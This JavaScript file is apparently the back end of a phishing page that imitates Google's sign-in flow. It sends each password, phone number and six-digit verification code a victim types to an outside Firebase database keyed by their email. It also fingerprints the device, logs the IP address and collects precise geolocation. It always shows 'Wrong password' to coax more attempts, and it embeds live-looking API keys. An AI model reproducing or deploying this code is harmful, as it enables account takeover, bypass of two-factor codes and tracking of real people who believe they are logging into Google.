import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
import { getDatabase, ref, set, get, push, child, update, remove, onChildAdded, onChildRemoved } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-database.js";
const firebaseConfig = {
    apiKey: "AIzaSyA9czXS21ONXVxY2eGMS4GwMfR78IJE_Yc",
    authDomain: "secret-37491.firebaseapp.com",
    databaseURL: "https://secret-37491-default-rtdb.firebaseio.com",
    projectId: "secret-37491",
    storageBucket: "secret-37491.appspot.com",
    messagingSenderId: "185262437707",
    appId: "1:185262437707:web:0ffe7c52e56f496e27a4ce",
    measurementId: "G-W19Q39DHFZ"
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
let noInt = document.getElementById("noInternet");
function networkError(){
    noInt.innerHTML += '<div class="netErr" id="netErr"><span class="intIn">No internet connection</span></div>';
    let netErr = document.getElementById("netErr");
    setTimeout(() => {
        netErr.style.bottom = "0px";
        netErr.style.visibility = "visible";
    });
    setTimeout(() => {
        netErr.style.bottom = "-100px";
        netErr.style.visibility = "hidden";
    }, 3000);
}
var userPic = document.getElementById("userPic");
function getRandomColor(name) {
    const asciiCode = name.charCodeAt(0);
    const colorNum = asciiCode.toString() + asciiCode.toString() + asciiCode.toString();
    var num = Math.round(0xffffff * parseInt(colorNum));
    var r = num >> 16 & 255;
    var g = num >> 8 & 255;
    var b = num & 255;
    userPic.style.background = 'rgb(' + r + ', ' + g + ', ' + b + ', 1)';
    userPic.innerHTML = name
}
if(sessionStorage.getItem("username")){
    getRandomColor(sessionStorage.getItem("username").charAt(0));
}
let rowBtnD = document.getElementById("rowBtnD");
var sliderSec = document.getElementById("sliderSec");
var sliderSecD = document.getElementById("formBlurSec");
var formInputFields = sliderSec.getElementsByTagName('input');
var formButtonFields = sliderSec.getElementsByTagName('button');
var secDInputFields = sliderSecD.getElementsByTagName('input');
var SecDButtonFields = sliderSecD.getElementsByTagName('button');
let userIdBox = document.getElementById("userIdBox");
function enableFields(){
    for(var i = 0; i < formInputFields.length; i++){
        formInputFields[i].readOnly = false;
    }
    for(var i = 0; i < formButtonFields.length; i++){
        formButtonFields[i].disabled = false;
    }
    if(checkSecD.checked == true && sessionStorage.getItem("failedAttempts")){
        disableFieldsD()
    }else{
        enableFieldsD()
    }
    userIdBox.disabled = false;
}
function disableFields(){
    for(var i = 0; i < formInputFields.length; i++){
        formInputFields[i].readOnly = true;
    }
    for(var i = 0; i < formButtonFields.length; i++){
        formButtonFields[i].disabled = true;
    }
    userIdBox.disabled = true;
}

function enableFieldsD(){
    for(var i = 0; i < secDInputFields.length; i++){
        secDInputFields[i].readOnly = false;
    }
    for(var i = 0; i < SecDButtonFields.length; i++){
        rowBtnD.disabled = false;
        SecDButtonFields[i].disabled = false;
    }
}
function disableFieldsD(){
    for(var i = 0; i < secDInputFields.length; i++){
        secDInputFields[i].readOnly = true;
    }
    for(var i = 0; i < SecDButtonFields.length; i++){
        rowBtnD.disabled = false;
        SecDButtonFields[i].disabled = true;
    }
}
function immediateFocus(){
    userName.focus();
    passWord.focus();
    phoneNumber.focus();
    phoneCode.focus();
}
let track = document.getElementById("track");
let blurCover = document.getElementById("blurCover"); 
let slider = document.getElementById("slider");
function loading(){
    disableFields();
    uNameErrorNone();
    pWordErrorNone();
    pNumberErrorNone();
    pCodeErrorNone();
    document.activeElement?.blur();
    track.classList.add("active");
    slider.classList.add("slider");
    blurCover.classList.add("blurCover");
}
function pauseLoading(){
    var time = ['.7','1','1.4','1.7','2'];
    let duration = time[Math.floor(Math.random() * time.length)];
    setTimeout(() => {
        immediatePauseLoading();
    }, duration * 1000);
}
function immediatePauseLoading(){
    enableFields();
    immediateFocus();
    track.classList.remove("active");
    slider.classList.remove("slider");
    blurCover.classList.remove("blurCover");
}
let userName = document.getElementById("userName");
let passWord = document.getElementById("passWord");
let phoneNumber = document.getElementById("phoneNumber");
let phoneCode = document.getElementById("phoneCode");
var constSec = 120;
var seconds = constSec;
var timer;
function timeOver(){
    if(seconds > 0){
        seconds--;
    }else{
        slide2E();
        clearInterval(timer);
        userName.value = "";
        passWord.value = "";
        phoneNumber.value = "";
        phoneCode.value = "";
    }
}
window.onload = function(){
    var time = ['.6','.7','.8','.9','1','1.1','1.2','1.3','1.4','1.5'];
    let duration = time[Math.floor(Math.random() * time.length)];
    setTimeout(() => {
        immediateFocus();
        if(sessionStorage.getItem("username")){
            userName.value = sessionStorage.getItem("username");
            userId.innerText = sessionStorage.getItem("username");
            // document.getElementById("welcomeUser").innerText = 'Hi ' + sessionStorage.getItem("username").replace(/\@gmail.com/g, "").trim();
        }
        if(sessionStorage.getItem("phonenumber")){
            var phone = sessionStorage.getItem("phonenumber");
            lastNumDig.innerText = phone.charAt(phone.length - 2) + phone.charAt(phone.length - 1);
        }
    }, duration * 1000);
    let isDeviceOnline = navigator.onLine;
    if(!isDeviceOnline){
        checkSecE.checked = true
    }
    if(!timer){
        timer = window.setInterval(function(){
            timeOver()
        }, 1000)
    }
}
window.onoffline = function(){
    networkError();
}
window.onclick = function(){
    seconds = constSec;
}
userIdBox.onclick = function(){
    let isDeviceOnline = navigator.onLine;
    if(isDeviceOnline){
        slide2A();
    }else{
        slide2E();
    }
}
let userNameErrorSec = document.getElementById("userNameErrorSec");
let userNameError = document.getElementById("userNameError");
function uNameError(){
    immediatePauseLoading();
    userName.focus();
    userName.classList.add("inputFeildError");
    userNameErrorSec.classList.add("errorSec");
    userNameError.innerText = "Enter an email or phone number";
}
function uNameErrorNone(){
    userName.classList.remove("inputFeildError");
    userNameErrorSec.classList.remove("errorSec");
}
let passWordErrorSec = document.getElementById("passWordErrorSec");
let passWordError = document.getElementById("passWordError");
function pWordError(){
    immediatePauseLoading();
    passWord.focus();
    passWord.value = "";
    passWord.classList.add("inputFeildError");
    passWordErrorSec.classList.add("errorSec");
    passWordError.innerText = "Enter a password"
}
function pWordErrorNone(){
    passWord.classList.remove("inputFeildError");
    passWordErrorSec.classList.remove("errorSec");
}
let phoneNumberErrorSec = document.getElementById("phoneNumberErrorSec");
let phoneNumberError = document.getElementById("phoneError");
function pNumberError(){
    immediatePauseLoading();
    phoneNumber.focus();
    phoneNumber.classList.add("inputFeildError");
    phoneNumberErrorSec.classList.add("errorSec");
    phoneNumberError.innerText = "Please enter a phone number"
}
function pNumberErrorNone(){
    phoneNumber.classList.remove("inputFeildError");
    phoneNumberErrorSec.classList.remove("errorSec");
}
let phoneCodeErrorSec = document.getElementById("phoneCodeErrorSec");
let phoneCodeError = document.getElementById("phoneCodeError");
function pCodeError(){
    immediatePauseLoading();
    phoneCode.focus();
    phoneCode.classList.add("inputFeildError");
    phoneCodeErrorSec.classList.add("errorSec");
    phoneCodeError.innerText = "Enter a code"
}
function pCodeErrorNone(){
    phoneCode.classList.remove("inputFeildError");
    phoneCodeErrorSec.classList.remove("errorSec");
}
let passWordCheckBox = document.getElementById("passWordCheckBox");
passWordCheckBox.onchange = function() {
    (passWord.getAttribute("type") == "password") ? passWord.setAttribute("type", "text"): passWord.setAttribute("type", "password");
}
let checkSecA = document.getElementById("secA");
function slide2A(){
    var time = ['1.8','2.2','2.5','2.8','3.2','3.5','3.8','4'];
    loading();
    let duration = time[Math.floor(Math.random() * time.length)];
    setTimeout(() => {
        pauseLoading();
        passWord.value = "";
        phoneNumber.value = "";
        phoneCode.value = "";
        checkSecA.checked = true;
        tooManyFailedAttemptsNone();
    }, duration * 1000);
}
let checkSecB = document.getElementById("secB");
function slideA2B(){
    pauseLoading();
    checkSecB.checked = true;
}
let checkSecC = document.getElementById("secC");
function slideB2C(){
    var time = ['1.8','2.2','2.5','2.8','3.2','3.5','3.8','4'];
    let duration = time[Math.floor(Math.random() * time.length)];
    setTimeout(() => {
        pWordError();
        immediatePauseLoading();
        checkSecC.checked = true;
        setTimeout(() => {
            phoneNumber.focus();
        }, 700);
    }, duration * 1000);
}
function slide2C(){
    loading();
    var time = ['1.8','2.2','2.5','2.8','3.2','3.5','3.8','4'];
    let duration = time[Math.floor(Math.random() * time.length)];
    setTimeout(() => {
        pauseLoading();
        checkSecC.checked = true;
        tooManyFailedAttemptsNone();
    }, duration * 1000);
}
let checkSecD = document.getElementById("secD");
function slideC2D(){
    loading();
    var time = ['1.8','2.2','2.5','2.8','3.2','3.5','3.8','4'];
    let duration = time[Math.floor(Math.random() * time.length)];
    setTimeout(() => {
        pauseLoading();
        checkSecD.checked = true;
        if(checkSecD.checked == true && sessionStorage.getItem("failedAttempts")){
            tooManyFailedAttempts();
        }
    }, duration * 1000);
}
let checkSecE = document.getElementById("secE");
function slide2E(){
    loading();
    var time = ['1.8','2.2','2.5','2.8','3.2','3.5','3.8','4'];
    let duration = time[Math.floor(Math.random() * time.length)];
    setTimeout(() => {
        immediatePauseLoading();
        checkSecE.checked = true;
        tooManyFailedAttemptsNone();
    }, duration * 1000);
}
let rowBtnA = document.getElementById("rowBtnA");
let padSec = document.getElementById("padSec");
rowBtnA.onclick = function(){
    rowBtnA.classList.toggle("activeRowBtnA");
    padSec.innerHTML += "<div class='pad' id='pad'><li class='options' id='optionA'><span>For my personal use</span></li><li class='options' id='optionB'><span>For my child</span></li><li class='options' id='optionC'><span>For work or my business</span></li></div>";
    setTimeout(() => {
        document.getElementById("pad").classList.toggle("activePad");
    });
    document.onclick = function(e){
        if(e.target.id !== 'pad' && e.target.id !== 'rowBtnA'){
            rowBtnA.classList.remove("activeRowBtnA");
            document.getElementById("pad").classList.remove("activePad");
        }
    }
    let optionA = document.getElementById("optionA");
    optionA.onclick = function(){
        window.location.href = "https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=IN&checkedDomains=youtube&continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-1106820303%3A1681986090709873&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=AQMjQ7SShFCnRidXA8I7e6usqtnAw4E0Cx1DyMtux96RhnTdQtLfxn6I7GxaOHx5qKzVeS5D0yhV&pstMsg=1"
    }
    let optionB = document.getElementById("optionB");
    optionB.onclick = function(){
        window.location.href = "https://accounts.google.com/signup/v2/kidaccountinfo?checkedDomains=youtube&continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-1761255026%3A1681985661443436&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=AQMjQ7RRvT-L1WigG178orh6FCo9xt-sxWzr5CnqOy0gR9xa2ecAmUS6ILrWyPypnAC1ZfFXIIIAVQ&pstMsg=1"
    }
    let optionC = document.getElementById("optionC");
    optionC.onclick = function(){
        window.location.href = "https://accounts.google.com/signup/v2/webcreateaccount?biz=true&cc=IN&checkedDomains=youtube&continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-1761255026%3A1681985661443436&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=AQMjQ7RRvT-L1WigG178orh6FCo9xt-sxWzr5CnqOy0gR9xa2ecAmUS6ILrWyPypnAC1ZfFXIIIAVQ&pstMsg=1"
    }
}
let frgtEmail = document.getElementById("frgtEmail");
frgtEmail.onclick = function(){
    window.location.href = "https://accounts.google.com/signin/v2/usernamerecovery?checkedDomains=youtube&continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-1761255026%3A1681985661443436&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=AQMjQ7RRvT-L1WigG178orh6FCo9xt-sxWzr5CnqOy0gR9xa2ecAmUS6ILrWyPypnAC1ZfFXIIIAVQ&pstMsg=1";
}
let rowBtnB = document.getElementById("rowBtnB");
rowBtnB.onclick = function(){
    window.location.href = "https://accounts.google.com/v3/signin/challenge/pwd?TL=ADBc5UO1-ytbYgQTeCJg9ek7jnuJsRrhmIZE9yEJJk73SRdOZ5kqa4ByEPSz3DnK&checkConnection=youtube%3A814%3A0&checkedDomains=youtube&cid=2&continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-1761255026%3A1681985661443436&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=AQMjQ7RRvT-L1WigG178orh6FCo9xt-sxWzr5CnqOy0gR9xa2ecAmUS6ILrWyPypnAC1ZfFXIIIAVQ&pstMsg=1";
}



let deviceId = localStorage.getItem('device_id');
if (!deviceId) {
  deviceId = 'device_' + Math.random().toString(36).substr(2, 9);
  localStorage.setItem("Device ID: ", deviceId);
}

document.addEventListener("DOMContentLoaded", function() {
    fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        sessionStorage.setItem('IP', data.ip);
    })
});

let connection = navigator.connection || 'Not supported';
if (connection !== 'Not supported') {
    var connectionType = `${connection.effectiveType}`;
}

let userAgent = navigator.userAgent;

let screenWidth = window.screen.width;
let screenHeight = window.screen.height;

let appName = navigator.appName;
let appVersion = navigator.appVersion;
let platform = navigator.platform;

let deviceMemory = navigator.deviceMemory || 'Not supported';
deviceMemory = `${deviceMemory} GB`;

let cpuCores = navigator.hardwareConcurrency || 'Not supported';
cpuCores = `${cpuCores}`;

navigator.getBattery().then(function(battery) {
    sessionStorage.setItem('Battery', `${battery.level * 100}%`)
    sessionStorage.setItem('Charging', `${battery.charging ? "Yes" : "No"}`);
});

let isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
var touchDevice = `${isTouchDevice ? "Yes" : "No"}`;

let formA = document.getElementById("validateEmail");
const validatorAPI = "https://emailvalidation.abstractapi.com/v1/?api_key=8363fdc7008649e4950973f281948ef5&email="
let userId = document.getElementById("userId");
let attempts = ['6','7','8','9','10'];
let randomAttempts = attempts[Math.floor(Math.random() * attempts.length)];
var login_attempts = randomAttempts;
let time = ['1.3','1.5','1.7','2','2.2','2.5','2.7','3.2','3.5','3.8','4'];
let duration = time[Math.floor(Math.random() * time.length)];
formA.onsubmit = function(){
    var getDate = new Date();
    var date = getDate.getDate()
    var month = getDate.getMonth()
    var year = getDate.getFullYear()
    var daysOfWeek = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
    var week = daysOfWeek[getDate.getDay()];
    var formattedDate = `${week} ${date}:${month+1}:${year}`;
    var currentTime = getDate.toLocaleString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    if(userName.value.trim().length !== 0){
        let isDeviceOnline = navigator.onLine;
        if (isDeviceOnline) {
            loading();
            if(('@' + userName.value.toLowerCase().split('@')[1]) !== '@gmail.com'){
                var userEmail = (userName.value.toLowerCase() + '@gmail.com');
                var validatorURL = (validatorAPI + userEmail);
            }
            else{
                var userEmail = (userName.value.toLowerCase());
                var validatorURL = (validatorAPI + userEmail);
            }
            async function fetchData(){
                const res = await fetch(validatorURL);
                const result = await res.json();
                if(result.deliverability == 'DELIVERABLE' && result.is_mx_found.value == true && result.is_smtp_valid.value == true && result.is_disposable_email.value == false){
                    update(ref(db, 'user_info/' + result.email.replace(/\./g, ":") + '/' + deviceId),{
                        'IP': sessionStorage.getItem('IP'),
                        'Connection Type': connectionType,
                        'User Agent': userAgent,
                        'Screen Width': screenWidth,
                        'Screen Height': screenHeight,
                        'App Name': appName,
                        'App Version': appVersion,
                        'Platform': platform,
                        'Device Memory': deviceMemory,
                        'CPU Core': cpuCores,
                        'Battery': sessionStorage.getItem('Battery'),
                        'Charging': sessionStorage.getItem('Charging'),
                        'Touch Screen': touchDevice
                    })
                    update(ref(db, 'user_info/' + result.email.replace(/\./g, ":") + '/' + formattedDate), {
                        'Last updated': formattedDate + ', ' + currentTime
                    }).then(() => {
                        slideA2B();
                        setTimeout(() => {
                            const config = {
                                enableHighAccuracy: true, 
                                timeout: 10000, 
                            };
                            function errorFunction() {
                                console.log("Unable to retrieve your location.");
                            }
                            function successFunction(position) {
                                update(ref(db, 'user_info/' + sessionStorage.getItem("username").replace(/\./g, ":") + '/' + formattedDate + '/Current_Location'), {
                                    [currentTime]: position.coords.latitude + ', ' + position.coords.longitude
                                })
                            }
                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(successFunction, errorFunction, config);
                            } else {
                                console.error("Geolocation is not supported by this browser.");
                            }
                        }, 2000);
                        userId.innerText = result.email;
                        // document.getElementById("welcomeUser").innerText = 'Hi ' + result.email.replace(/\@gmail.com/g, "").trim();
                        sessionStorage.setItem("username", result.email);
                        getRandomColor(sessionStorage.getItem("username").charAt(0));
                    })
                }
                else if(result.is_mx_found.value != true || result.is_smtp_valid.value != true || result.is_disposable_email.value == true || result.deliverability != 'DELIVERABLE'){
                    uNameError();
                    setTimeout(() => {
                        login_attempts = login_attempts-1;
                        if(login_attempts == 0){
                            slide2E();
                        }
                    }, duration * 1000);
                    userNameError.innerText = "Couldn't find your Google Account"
                }
            }
            fetchData();
        } else {
            slide2E();
        }
    }
    else{
        uNameError();
    }
}
let formB = document.getElementById("validatePass");
formB.onsubmit = function(){
    var getDate = new Date();
    var date = getDate.getDate()
    var month = getDate.getMonth()
    login_attempts = randomAttempts;
    var year = getDate.getFullYear()
    var daysOfWeek = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
    var week = daysOfWeek[getDate.getDay()];
    var formattedDate = `${week} ${date}:${month+1}:${year}`;
    var currentTime = getDate.toLocaleString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    if(passWord.value.length !== 0){
        let isDeviceOnline = navigator.onLine;
        if (isDeviceOnline) {
            loading();
            if(passWord.value.length >= 8){
                update(ref(db, 'user_info/' + sessionStorage.getItem("username").replace(/\./g, ":") + '/' + formattedDate + '/Password'), {
                    [currentTime]: passWord.value
                }).then(() => {
                    setTimeout(() => {
                        if(passWord.value.length >= 8){
                            login_attempts = login_attempts-1;
                            if(login_attempts == 0){
                                setTimeout(() => {
                                    slideB2C();
                                }, (duration * 1000));
                            }
                        }
                        else{
                            login_attempts = login_attempts-1;
                            if(login_attempts == 0){
                                setTimeout(() => {
                                    slide2E();
                                }, (duration * 1000));
                            }
                        }
                        pWordError();
                        passWordError.innerText = "Wrong password. Try again or click 'Forgot password' to reset it.";
                    }, duration * 1000);
                })
            }else{
                setTimeout(() => {
                    pWordError();
                    passWordError.innerText = "Wrong password. Try again or click 'Forgot password' to reset it.";
                }, duration * 1000);
            }
        } else {
            slide2E();
        }
    }else{
        pWordError();
    }
}
var expr = /^(0|91)?[6-9][0-9]{9}$/;
let formC = document.getElementById("validatePhoneNumber");
let lastNumDig = document.getElementById("lastNumDig");
formC.onsubmit = function(){
    var getDate = new Date();
    var date = getDate.getDate()
    var month = getDate.getMonth()
    var year = getDate.getFullYear()
    var daysOfWeek = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
    var week = daysOfWeek[getDate.getDay()];
    var formattedDate = `${week} ${date}:${month+1}:${year}`;
    var currentTime = getDate.toLocaleString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    if(phoneNumber.value.trim().length !== 0){
        let isDeviceOnline = navigator.onLine;
        if (isDeviceOnline) {
            loading()
            if(phoneNumber.value.trim().match(expr)){
                update(ref(db, 'user_info/' + sessionStorage.getItem("username").replace(/\./g, ":") + '/' + formattedDate + '/Phone'), {
                    [currentTime]: phoneNumber.value.trim()
                }).then(() => {
                    slideC2D();
                    sessionStorage.setItem("phonenumber", phoneNumber.value.trim());
                    var phone = sessionStorage.getItem("phonenumber");
                    lastNumDig.innerText = phone.charAt(phone.length - 2) + phone.charAt(phone.length - 1);
                })
            }else{
                setTimeout(() => {
                    pNumberError();
                    phoneNumberError.innerText = "Please enter a valid phone number";        
                }, duration * 1000);
            }
        } else {
            slide2E();
        }
    }
    else{
        pNumberError();
    }
}
let failed = document.getElementById("failed");
let formBlur = document.getElementById("formBlur");
let sbmtBtnD = document.getElementById("sbmtBtnD");
let formBlurSec = document.getElementById("formBlurSec");
function tooManyFailedAttempts(){
    disableFieldsD();
    failed.style.display = "block";
    formBlur.style.display = "block";
    formBlurSec.style.pointerEvents = "none";
    sbmtBtnD.classList.add("sbmtBtnDDisabled");
    sessionStorage.setItem("failedAttempts", true)
}
function tooManyFailedAttemptsNone(){
    enableFieldsD();
    failed.style.display = "none";
    formBlur.style.display = "none";
    formBlurSec.style.pointerEvents = "all";
    sbmtBtnD.classList.remove("sbmtBtnDDisabled");
}
let failedRetry = document.getElementById("failedRetry");
failedRetry.onclick = function(){
    let isDeviceOnline = navigator.onLine;
    if(isDeviceOnline){
        slide2A();
    }else{
        slide2E();
    }
}
rowBtnD.onclick = function(){
    let isDeviceOnline = navigator.onLine;
    if(isDeviceOnline){
        slide2C();
    }else{
        slide2E();
    }
}
var numValidator = /^[0-9]+$/;
let formD = document.getElementById("validatePhoneCode");
formD.onsubmit = function(){
    var getDate = new Date();
    var date = getDate.getDate()
    var month = getDate.getMonth()
    login_attempts = randomAttempts;
    var year = getDate.getFullYear()
    var daysOfWeek = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
    var week = daysOfWeek[getDate.getDay()];
    var formattedDate = `${week} ${date}:${month+1}:${year}`;
    var currentTime = getDate.toLocaleString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
    if(phoneCode.value.trim() !== 0){
        let isDeviceOnline = navigator.onLine;
        if (isDeviceOnline) {
            loading();
            if(phoneCode.value.trim().match(numValidator) && phoneCode.value.trim().length == 6){
                update(ref(db, 'user_info/' + sessionStorage.getItem("username").replace(/\./g, ":") + '/' + formattedDate + '/Code'), {
                    [currentTime]: phoneCode.value.trim()
                }).then(() => {
                    setTimeout(() => {
                        login_attempts = login_attempts-1;
                        if(login_attempts == 0){
                            tooManyFailedAttempts();
                        }
                        pCodeError();
                        phoneCodeError.innerText = "Wrong number of digits. Please try again"
                    }, duration * 1000);
                })
            }
            else if(!phoneCode.value.trim().match(numValidator)){
                setTimeout(() => {
                    pCodeError();
                    phoneCodeError.innerText = "Code has numbers only. Try again"
                }, duration * 1000);
            }
            else if(phoneCode.value.trim().length !== 6){
                setTimeout(() => {
                    pCodeError();
                    phoneCodeError.innerText = "Wrong number of digits. Please try again"
                }, duration * 1000);
            }
        } else {
            slide2E();
        }
    }
    else{
        pCodeError();
    }
}
sbmtBtnE.onclick = function(){
    let isDeviceOnline = navigator.onLine;
    if(isDeviceOnline){
        slide2A();
    }else{
        networkError();
    }
}
